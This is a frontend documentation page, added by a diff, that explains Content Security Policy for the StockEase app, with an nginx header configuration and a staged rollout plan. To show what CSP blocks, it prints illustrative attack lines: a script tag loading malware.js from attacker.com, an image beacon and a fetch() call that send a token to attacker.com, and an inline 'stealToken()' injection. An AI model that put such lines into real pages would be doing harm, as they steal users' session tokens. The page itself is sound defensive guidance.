@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>csp - StockEase Frontend Docs</title>
+  <!-- Will be set to a repo-relative path at runtime -->
+  <link rel="stylesheet" href="/frontend/templates/frontend-docs.css">
+</head>
+<body>
+  <header>
+    <div class="header-content">
+      <a id="home-link" href="#" class="logo">📚 StockEase Frontend Docs</a>
+      <nav class="nav-breadcrumb">
+        <a id="home-crumb" href="#">Home</a> / <span id="breadcrumb">Documentation</span>
+      </nav>
+    </div>
+  </header>
+
+  <div class="container">
+    <aside id="sidebar"></aside>
+    <main>
+      <div class="content">
+        <h1 id="content-security-policy-csp">Content Security Policy
+        (CSP)</h1>
+        <h2 id="overview">Overview</h2>
+        <p>Content Security Policy (CSP) is an HTTP header that tells
+        the browser which external resources are allowed to load. This
+        prevents XSS attacks and unauthorized script execution.</p>
+        <hr />
+        <h2 id="what-is-csp">What is CSP?</h2>
+        <h3 id="problem-it-solves">Problem It Solves</h3>
+        <p><strong>Without CSP:</strong></p>
+        <div class="sourceCode" id="cb1"><pre
+        class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Any malicious script can load and execute --&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://attacker.com/malware.js&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Injected via XSS --&gt;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Any external resource can load --&gt;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://attacker.com/capture.gif?token=stolen&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Leaks data through image request --&gt;</span></span></code></pre></div>
+        <p><strong>With CSP:</strong></p>
+        <pre class="http"><code>Content-Security-Policy: 
+  default-src &#39;self&#39;;
+  script-src &#39;self&#39; &#39;unsafe-inline&#39;;
+  img-src &#39;self&#39; data: https:;
+
+&lt;!-- Malicious script blocked (not from allowed source) --&gt;
+&lt;script src=&quot;https://attacker.com/malware.js&quot;&gt;&lt;/script&gt;  ❌ BLOCKED
+
+&lt;!-- External image blocked (attacker.com not allowed) --&gt;
+&lt;img src=&quot;https://attacker.com/capture.gif&quot;&gt;  ❌ BLOCKED</code></pre>
+        <h3 id="csp-directives">CSP Directives</h3>
+        <p>CSP uses directives to specify what types of resources can
+        load from where.</p>
+        <table>
+        <thead>
+        <tr class="header">
+        <th>Directive</th>
+        <th>Controls</th>
+        <th>Examples</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr class="odd">
+        <td><code>default-src</code></td>
+        <td>All resources</td>
+        <td>Scripts, styles, images, fonts</td>
+        </tr>
+        <tr class="even">
+        <td><code>script-src</code></td>
+        <td>JavaScript files</td>
+        <td><code>&lt;script&gt;</code> tags, event handlers</td>
+        </tr>
+        <tr class="odd">
+        <td><code>style-src</code></td>
+        <td>CSS stylesheets</td>
+        <td><code>&lt;link rel="stylesheet"&gt;</code>,
+        <code>&lt;style&gt;</code></td>
+        </tr>
+        <tr class="even">
+        <td><code>img-src</code></td>
+        <td>Images</td>
+        <td><code>&lt;img&gt;</code>, background images</td>
+        </tr>
+        <tr class="odd">
+        <td><code>font-src</code></td>
+        <td>Web fonts</td>
+        <td><code>@font-face</code> in CSS</td>
+        </tr>
+        <tr class="even">
+        <td><code>connect-src</code></td>
+        <td>API calls, WebSocket</td>
+        <td><code>fetch()</code>, <code>XMLHttpRequest</code></td>
+        </tr>
+        <tr class="odd">
+        <td><code>frame-src</code></td>
+        <td>Iframes</td>
+        <td><code>&lt;iframe&gt;</code></td>
+        </tr>
+        <tr class="even">
+        <td><code>media-src</code></td>
+        <td>Audio/video</td>
+        <td><code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></td>
+        </tr>
+        <tr class="odd">
+        <td><code>object-src</code></td>
+        <td>Plugins</td>
+        <td><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code></td>
+        </tr>
+        </tbody>
+        </table>
+        <h3 id="policy-sources">Policy Sources</h3>
+        <p>When specifying where resources can load from:</p>
+        <table>
+        <thead>
+        <tr class="header">
+        <th>Source</th>
+        <th>Allows</th>
+        <th>Example</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr class="odd">
+        <td><code>'self'</code></td>
+        <td>Same origin only</td>
+        <td><code>https://frontend.stockease.com</code></td>
+        </tr>
+        <tr class="even">
+        <td><code>'none'</code></td>
+        <td>Block all</td>
+        <td>Never load this resource type</td>
+        </tr>
+        <tr class="odd">
+        <td><code>'unsafe-inline'</code></td>
+        <td>Inline code</td>
+        <td><code>&lt;script&gt;code&lt;/script&gt;</code> (not
+        recommended)</td>
+        </tr>
+        <tr class="even">
+        <td><code>'unsafe-eval'</code></td>
+        <td>eval()</td>
+        <td><code>eval()</code>, <code>Function()</code> (not
+        recommended)</td>
+        </tr>
+        <tr class="odd">
+        <td><code>https:</code></td>
+        <td>Any HTTPS</td>
+        <td><code>https://cdn.example.com</code>,
+        <code>https://anything.com</code></td>
+        </tr>
+        <tr class="even">
+        <td><code>data:</code></td>
+        <td>Data URLs</td>
+        <td><code>data:image/png;base64,...</code></td>
+        </tr>
+        <tr class="odd">
+        <td>Specific URL</td>
+        <td>Exact domain</td>
+        <td><code>https://cdn.stockease.com</code></td>
+        </tr>
+        </tbody>
+        </table>
+        <hr />
+        <h2 id="current-stockease-csp-configuration">Current StockEase
+        CSP Configuration</h2>
+        <h3 id="what-we-have">What We Have</h3>
+        <p>Currently, StockEase does <strong>NOT have an explicit CSP
+        header</strong> configured. This means the browser uses default
+        policies.</p>
+        <h3 id="why-add-csp">Why Add CSP?</h3>
+        <ol type="1">
+        <li><strong>Extra Layer of Protection</strong> — Even if input
+        validation is bypassed, CSP can stop scripts from running</li>
+        <li><strong>Compliance</strong> — OWASP and security standards
+        recommend CSP</li>
+        <li><strong>Defense in Depth</strong> — Multiple security
+        layers</li>
+        </ol>
+        <hr />
+        <h2 id="implementing-csp-in-stockease">Implementing CSP in
+        StockEase</h2>
+        <h3 id="step-1-add-csp-header-nginx">Step 1: Add CSP Header
+        (nginx)</h3>
+        <p>Edit <code>ops/nginx/nginx.conf</code>:</p>
+        <pre class="nginx"><code>server {
+  listen 80;
+  server_name _;
+  root /usr/share/nginx/html;
+
+  # ... existing configuration ...
+
+  # =========================================================================
+  # Content Security Policy (CSP) Header
+  # =========================================================================
+  add_header Content-Security-Policy &quot;
+    default-src &#39;self&#39;;
+    script-src &#39;self&#39; &#39;unsafe-inline&#39;;
+    style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com;
+    font-src &#39;self&#39; https://fonts.gstatic.com data:;
+    img-src &#39;self&#39; data: https:;
+    connect-src &#39;self&#39; https://api.stockease.com;
+    frame-src &#39;none&#39;;
+    object-src &#39;none&#39;;
+    base-uri &#39;self&#39;;
+    form-action &#39;self&#39;;
+  &quot; always;
+
+  # =========================================================================
+  # CSP Report-Only (Testing Mode)
+  # =========================================================================
+  # Use this while testing CSP to see violations without blocking
+  # add_header Content-Security-Policy-Report-Only &quot;...&quot; always;
+}</code></pre>
+        <p><strong>Explanation:</strong></p>
+        <table>
+        <thead>
+        <tr class="header">
+        <th>Directive</th>
+        <th>Setting</th>
+        <th>Why</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr class="odd">
+        <td><code>default-src 'self'</code></td>
+        <td>Block external by default</td>
+        <td>Most restrictive, safest</td>
+        </tr>
+        <tr class="even">
+        <td><code>script-src 'self' 'unsafe-inline'</code></td>
+        <td>Allow local and inline scripts</td>
+        <td>Needed for React inline event handlers</td>
+        </tr>
+        <tr class="odd">
+        <td><code>style-src 'self' 'unsafe-inline'</code></td>
+        <td>Allow local and inline CSS</td>
+        <td>Tailwind uses inline styles</td>
+        </tr>
+        <tr class="even">
+        <td><code>font-src 'self' https://fonts.gstatic.com</code></td>
+        <td>Allow Google Fonts</td>
+        <td>App uses Google Fonts</td>
+        </tr>
+        <tr class="odd">
+        <td><code>img-src 'self' data: https:</code></td>
+        <td>Allow local, data URLs, HTTPS images</td>
+        <td>Display images from various sources</td>
+        </tr>
+        <tr class="even">
+        <td><code>connect-src 'self'</code></td>
+        <td>Only allow API calls to same origin</td>
+        <td>No external API calls</td>
+        </tr>
+        <tr class="odd">
+        <td><code>frame-src 'none'</code></td>
+        <td>Block iframes completely</td>
+        <td>Prevent clickjacking</td>
+        </tr>
+        <tr class="even">
+        <td><code>object-src 'none'</code></td>
+        <td>Block plugins</td>
+        <td>No Flash, Java, etc.</td>
+        </tr>
+        </tbody>
+        </table>
+        <h3 id="step-2-report-only-mode-recommended-first-step">Step 2:
+        Report-Only Mode (Recommended First Step)</h3>
+        <p><strong>Start with Report-Only</strong> to test without
+        breaking anything:</p>
+        <pre class="nginx"><code># This logs violations but doesn&#39;t block
+add_header Content-Security-Policy-Report-Only &quot;
+  default-src &#39;self&#39;;
+  script-src &#39;self&#39; &#39;unsafe-inline&#39;;
+  style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com;
+  font-src &#39;self&#39; https://fonts.gstatic.com data:;
+  img-src &#39;self&#39; data: https:;
+  connect-src &#39;self&#39; https://api.stockease.com;
+  frame-src &#39;none&#39;;
+  object-src &#39;none&#39;;
+&quot; always;</code></pre>
+        <p><strong>Test in production:</strong></p>
+        <ol type="1">
+        <li>Deploy with Report-Only header</li>
+        <li>Monitor browser console for CSP violations</li>
+        <li>Monitor server logs for reported violations</li>
+        <li>Fix violations one by one</li>
+        <li>Switch to enforcing CSP</li>
+        </ol>
+        <h3 id="step-3-monitor-violations">Step 3: Monitor
+        Violations</h3>
+        <p>CSP violations appear in:</p>
+        <ul>
+        <li>Browser console (DevTools → Console)</li>
+        <li>Network logs if report-uri configured</li>
+        <li>Server logs</li>
+        </ul>
+        <p><strong>Example violation in console:</strong></p>
+        <pre><code>Refused to load the script &#39;https://attacker.com/xss.js&#39; because 
+it violates the following Content Security Policy directive: 
+&quot;script-src &#39;self&#39; &#39;unsafe-inline&#39;&quot;.</code></pre>
+        <hr />
+        <h2 id="rollout-strategy">Rollout Strategy</h2>
+        <h3 id="phase-1-report-only-mode-1-2-weeks">Phase 1: Report-Only
+        Mode (1-2 weeks)</h3>
+        <pre class="nginx"><code># Monitor for violations
+add_header Content-Security-Policy-Report-Only &quot;...&quot; always;</code></pre>
+        <p><strong>Actions:</strong></p>
+        <ol type="1">
+        <li>Deploy to staging</li>
+        <li>Run full test suite</li>
+        <li>Check for console violations</li>
+        <li>Adjust policy based on findings</li>
+        </ol>
+        <h3 id="phase-2-enforce-permissive-csp-1-week">Phase 2: Enforce
+        Permissive CSP (1 week)</h3>
+        <pre class="nginx"><code># This enforces CSP but is still fairly permissive
+add_header Content-Security-Policy &quot;
+  default-src &#39;self&#39;;
+  script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;
+  style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com;
+  ...
+&quot; always;</code></pre>
+        <p><strong>Keep unsafe directives for first week:</strong></p>
+        <ul>
+        <li><code>'unsafe-inline'</code> — Gradual elimination</li>
+        <li><code>'unsafe-eval'</code> — Usually not needed, remove
+        ASAP</li>
+        </ul>
+        <h3 id="phase-3-enforce-strict-csp-ongoing">Phase 3: Enforce
+        Strict CSP (Ongoing)</h3>
+        <pre class="nginx"><code># Remove unsafe directives over time
+add_header Content-Security-Policy &quot;
+  default-src &#39;self&#39;;
+  script-src &#39;self&#39;;  # No unsafe-inline
+  style-src &#39;self&#39; https://fonts.googleapis.com;  # No unsafe-inline
+  ...
+&quot; always;</code></pre>
+        <p><strong>Benefits:</strong></p>
+        <ul>
+        <li>Strongest protection against XSS</li>
+        <li>Requires app refactoring (inline handlers → event
+        listeners)</li>
+        </ul>
+        <hr />
+        <h2 id="dealing-with-unsafe-inline">Dealing with
+        <code>unsafe-inline</code></h2>
+        <h3 id="why-its-needed-currently">Why It's Needed
+        (Currently)</h3>
+        <p>StockEase may use inline styles and handlers:</p>
+        <pre class="tsx"><code>// Inline styles
+&lt;div style={{ color: &#39;red&#39; }}&gt;Text&lt;/div&gt;
+
+// Inline event handlers
+&lt;button onClick={() =&gt; handleClick()}&gt;Click&lt;/button&gt;</code></pre>
+        <h3 id="why-its-risky">Why It's Risky</h3>
+        <p><code>'unsafe-inline'</code> allows any inline code,
+        defeating XSS protection:</p>
+        <div class="sourceCode" id="cb10"><pre
+        class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Attacker injects inline code via XSS</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div style<span class="op">=</span><span class="st">&quot;background: url(&#39;javascript:stealToken()&#39;)&quot;</span><span class="op">&gt;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="co">// This would execute with &#39;unsafe-inline&#39;</span></span></code></pre></div>
+        <h3 id="gradual-elimination">Gradual Elimination</h3>
+        <p><strong>Step 1: Extract Inline Styles</strong></p>
+        <div class="sourceCode" id="cb11"><pre
+        class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Before (inline)</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div style<span class="op">=</span>{{ color<span class="op">:</span> <span class="st">&#39;red&#39;</span> }}<span class="op">&gt;</span><span class="bu">Text</span><span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="co">// After (CSS class)</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;text-red&quot;</span><span class="op">&gt;</span><span class="bu">Text</span><span class="op">&lt;/</span>div<span class="op">&gt;</span></span></code></pre></div>
+        <p><strong>Step 2: Use CSS Modules</strong></p>
+        <div class="sourceCode" id="cb12"><pre
+        class="sourceCode typescript"><code class="sourceCode typescript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> styles <span class="im">from</span> <span class="st">&#39;./Button.module.css&#39;</span><span class="op">;</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>button className<span class="op">=</span>{styles<span class="op">.</span><span class="at">primary</span>}<span class="op">&gt;</span>Click<span class="op">&lt;/</span>button<span class="op">&gt;</span></span></code></pre></div>
+        <p><strong>Step 3: Remove unsafe-inline from CSP</strong></p>
+        <pre class="nginx"><code># No more &#39;unsafe-inline&#39;
+script-src &#39;self&#39;;
+style-src &#39;self&#39; https://fonts.googleapis.com;</code></pre>
+        <hr />
+        <h2 id="testing-csp">Testing CSP</h2>
+        <h3 id="browser-devtools-testing">Browser DevTools Testing</h3>
+        <ol type="1">
+        <li>Open DevTools (F12)</li>
+        <li>Go to Console tab</li>
+        <li>Try these actions:
+        <ul>
+        <li>Click buttons (should work)</li>
+        <li>Load images (should work)</li>
+        <li>Refresh page (should work)</li>
+        <li>Try injecting script:
+        <code>&lt;script&gt;alert('xss')&lt;/script&gt;</code> (should
+        fail)</li>
+        </ul></li>
+        </ol>
+        <h3 id="check-csp-header">Check CSP Header</h3>
+        <div class="sourceCode" id="cb14"><pre
+        class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co"># View CSP header</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-i</span> https://frontend.stockease.com <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> <span class="st">&quot;content-security-policy&quot;</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Output:</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Content-Security-Policy: default-src &#39;self&#39;; ...</span></span></code></pre></div>
+        <h3 id="simulate-xss-attack">Simulate XSS Attack</h3>
+        <div class="sourceCode" id="cb15"><pre
+        class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Try to load external script (should fail with CSP)</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-X</span> GET <span class="st">&quot;https://frontend.stockease.com&quot;</span> <span class="dt">\</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&quot;X-Requested-With: XMLHttpRequest&quot;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="co"># In browser console:</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Try: fetch(&#39;https://attacker.com/steal?token=&#39; + token)</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Should fail due to &#39;connect-src &#39;self&#39;&#39;</span></span></code></pre></div>
+        <hr />
+        <h2 id="common-csp-violations--fixes">Common CSP Violations
+        &amp; Fixes</h2>
+        <h3 id="issue-1-google-fonts-blocked">Issue 1: Google Fonts
+        Blocked</h3>
+        <p><strong>Error:</strong></p>
+        <pre><code>Refused to load https://fonts.googleapis.com/css
+because it violates the following CSP directive</code></pre>
+        <p><strong>Fix:</strong></p>
+        <pre class="nginx"><code>style-src &#39;self&#39; &#39;unsafe-inline&#39; https://fonts.googleapis.com;
+font-src &#39;self&#39; https://fonts.gstatic.com data:;</code></pre>
+        <h3 id="issue-2-inline-styles-blocked">Issue 2: Inline Styles
+        Blocked</h3>
+        <p><strong>Error:</strong></p>
+        <pre><code>Refused to apply inline style
+because it violates CSP directive</code></pre>
+        <p><strong>Causes:</strong></p>
+        <ul>
+        <li><code>&lt;div style="color: red"&gt;</code> (inline style
+        attribute)</li>
+        <li><code>&lt;style&gt;</code> tags in HTML</li>
+        <li>Tailwind inline styles</li>
+        </ul>
+        <p><strong>Fix Option 1:</strong> Add 'unsafe-inline'
+        (temporary)</p>
+        <pre class="nginx"><code>style-src &#39;self&#39; &#39;unsafe-inline&#39;;</code></pre>
+        <p><strong>Fix Option 2:</strong> Extract to CSS file
+        (better)</p>
+        <div class="sourceCode" id="cb20"><pre
+        class="sourceCode css"><code class="sourceCode css"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* styles.css */</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">.red-text</span> {</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">color</span>: <span class="cn">red</span><span class="op">;</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+        <pre class="tsx"><code>&lt;div className=&quot;red-text&quot;&gt;Text&lt;/div&gt;</code></pre>
+        <h3 id="issue-3-api-calls-blocked">Issue 3: API Calls
+        Blocked</h3>
+        <p><strong>Error:</strong></p>
+        <pre><code>Refused to connect to https://api.stockease.com/api/products
+because it violates CSP directive</code></pre>
+        <p><strong>Fix:</strong></p>
+        <pre class="nginx"><code>connect-src &#39;self&#39; https://api.stockease.com;</code></pre>
+        <h3 id="issue-4-inline-event-handlers-blocked">Issue 4: Inline
+        Event Handlers Blocked</h3>
+        <p><strong>Error:</strong></p>
+        <pre><code>Refused to execute inline event handler
+because it violates CSP directive</code></pre>
+        <p><strong>Cause:</strong></p>
+        <pre class="tsx"><code>&lt;button onclick=&quot;handleClick()&quot;&gt;Click&lt;/button&gt;</code></pre>
+        <p><strong>Fix:</strong></p>
+        <pre class="tsx"><code>// Use React event binding (automatic)
+&lt;button onClick={handleClick}&gt;Click&lt;/button&gt;
+// React handles this safely</code></pre>
+        <hr />
+        <h2 id="csp-best-practices">CSP Best Practices</h2>
+        <h3 id="-do">✅ DO:</h3>
+        <ul>
+        <li>✅ Start with Report-Only mode</li>
+        <li>✅ Test thoroughly before enforcing</li>
+        <li>✅ Keep CSP header in nginx (not HTML meta tag)</li>
+        <li>✅ Use 'self' as default</li>
+        <li>✅ Whitelist specific domains</li>
+        <li>✅ Remove 'unsafe-inline' over time</li>
+        <li>✅ Monitor violations in production</li>
+        <li>✅ Update CSP when adding new external resources</li>
+        </ul>
+        <h3 id="-dont">❌ DON'T:</h3>
+        <ul>
+        <li>❌ Use <code>default-src *</code> (defeats purpose)</li>
+        <li>❌ Allow 'unsafe-eval' (not needed in modern apps)</li>
+        <li>❌ Keep 'unsafe-inline' forever (security risk)</li>
+        <li>❌ Trust CSP alone (combine with input validation)</li>
+        <li>❌ Ignore CSP violations</li>
+        <li>❌ Use meta tags for CSP (use headers instead)</li>
+        </ul>
+        <hr />
+        <h2 id="related-files">Related Files</h2>
+        <ul>
+        <li><strong>nginx Config:</strong>
+        <code>ops/nginx/nginx.conf</code></li>
+        <li><strong>index.html:</strong> <code>index.html</code></li>
+        <li><strong>API Client:</strong>
+        <code>src/services/apiClient.ts</code></li>
+        <li><strong>Auth Security:</strong> See <a
+        href="../auth/jwt-tokens.html">JWT Tokens</a></li>
+        <li><strong>XSS Prevention:</strong> See <a
+        href="./xss-and-sanitization.html">XSS &amp;
+        Sanitization</a></li>
+        </ul>
+        <hr />
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a
+        href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">OWASP
+        CSP Cheat Sheet</a></li>
+        <li><a
+        href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">MDN
+        Content-Security-Policy</a></li>
+        <li><a href="https://csp-evaluator.withgoogle.com/">CSP Policy
+        Generator</a></li>
+        </ul>
+        <hr />
+        <p><strong>Last Updated:</strong> November 13, 2025<br />
+        <strong>Status:</strong> Recommended Implementation<br />
+        <strong>Priority:</strong> High (Defense in Depth)</p>
+      </div>
+    </main>
+  </div>
+
+  <footer>
+    <div class="footer-content">
+      <p><strong>StockEase</strong> - Inventory Management System</p>
+      <p>Architecture Documentation | Frontend</p>
+      <p style="opacity:.7;font-size:.85rem;">© 2025 Team StockEase. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script>
+    // Absolute base for the site on GitHub Pages
+    const BASE = '/frontend/';
+
+    // Sidebar (frontend-focused). Keep hrefs relative to 'architecture/' except where absolute noted.
+    const navigation = {
+      'Frontend Docs': [
+        { label: 'Landing', href: 'index.html', isRoot: true },
+        { label: 'Architecture Index', href: 'index.html' },
+        { label: 'Overview', href: 'overview.html' },
+        { label: 'Übersicht (Deutsch)', href: 'overview.de.html' },
+        { label: 'Docs Pipeline', href: 'docs-pipeline/overview.html' },
+        { label: 'Production Pipeline', href: 'pipeline/overview.html' },
+      ],
+      'Sections': [
+        { label: 'API Layer', href: 'src/api/overview.html' },
+        { label: 'Components', href: 'src/components/overview.html' },
+        { label: 'Security', href: 'src/security/overview.html' },
+        { label: 'Pages', href: 'src/pages/overview.html' },
+        { label: 'Services', href: 'src/services/overview.html' },
+        { label: 'Localization (i18n)', href: 'src/i18n/overview.html' },
+        { label: 'Docker Setup', href: 'src/docker_structure/overview.html' },
+        { label: 'Testing', href: 'src/tests/overview.html' },
+      ],
+      'Generated': [
+        // Use absolute internal paths so they always resolve with CSS
+        { label: 'TypeDoc (TS API)', href: '/frontend/typedoc/index.html', absolute: true },
+        { label: 'Coverage (Vitest)', href: '/frontend/coverage/index.html', absolute: true },
+      ],
+      'Backend (external)': [
+        { label: 'Backend Docs', href: 'https://keglev.github.io/stockease/', external: true },
+        { label: 'Backend API (ReDoc)', href: 'https://keglev.github.io/stockease/api-docs.html', external: true },
+        { label: 'Backend Coverage', href: 'https://keglev.github.io/stockease/coverage/', external: true },
+      ],
+    };
+
+    // Set header links to the site root
+    document.addEventListener('DOMContentLoaded', () => {
+      const home = BASE + 'index.html';
+      const homeLink = document.getElementById('home-link');
+      const homeCrumb = document.getElementById('home-crumb');
+      if (homeLink) homeLink.href = home;
+      if (homeCrumb) homeCrumb.href = home;
+    });
+
+    function buildSidebar() {
+      const sidebar = document.getElementById('sidebar');
+      if (!sidebar) return;
+
+      Object.entries(navigation).forEach(([section, links]) => {
+        const block = document.createElement('div');
+        block.className = 'nav-section';
+
+        const title = document.createElement('div');
+        title.className = 'nav-section-title';
+        title.textContent = section;
+        block.appendChild(title);
+
+        const ul = document.createElement('ul');
+        links.forEach(link => {
+          const li = document.createElement('li');
+          const a = document.createElement('a');
+
+          if (link.external || link.absolute) {
+            // external http(s) OR absolute internal '/frontend/...'
+            a.href = link.href;
+          } else if (link.isRoot) {
+            a.href = BASE + 'index.html';
+          } else if (link.isCoverage) {
+            a.href = BASE + 'coverage/index.html';
+          } else if (link.isApiDoc) {
+            a.href = BASE + 'api-docs.html';
+          } else {
+            // default: architecture-relative
+            a.href = BASE + 'architecture/' + link.href;
+          }
+
+          a.textContent = link.label;
+
+          // Active-state highlight
+          const current = window.location.pathname;
+          const linkPath = a.pathname.replace(/\.html$/, '');
+          if (current.endsWith(a.pathname) || current.includes(linkPath)) {
+            a.className = 'active';
+          }
+
+          li.appendChild(a);
+          ul.appendChild(li);
+        });
+
+        block.appendChild(ul);
+        sidebar.appendChild(block);
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', buildSidebar);
+  </script>
+
+  <!-- Mermaid.js for diagrams -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({
+      startOnLoad: false,
+      theme: 'default',
+      securityLevel: 'loose',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
+    });
+
+    // Convert fenced code blocks emitted by Pandoc to <div class="mermaid"> sources
+    const blocks = document.querySelectorAll('code.language-mermaid');
+    blocks.forEach(code => {
+      code.classList.remove('language-mermaid');
+      code.classList.add('mermaid');
+      if (code.parentElement.tagName === 'PRE') {
+        code.parentElement.classList.add('mermaid-block');
+      }
+    });
+
+    // Render all diagrams
+    (document.readyState === 'loading'
+      ? new Promise(r => document.addEventListener('DOMContentLoaded', r))
+      : Promise.resolve()
+    ).then(() => mermaid.run()).catch(err => console.error('Mermaid rendering error:', err));
+  </script>
+</body>
+</html>
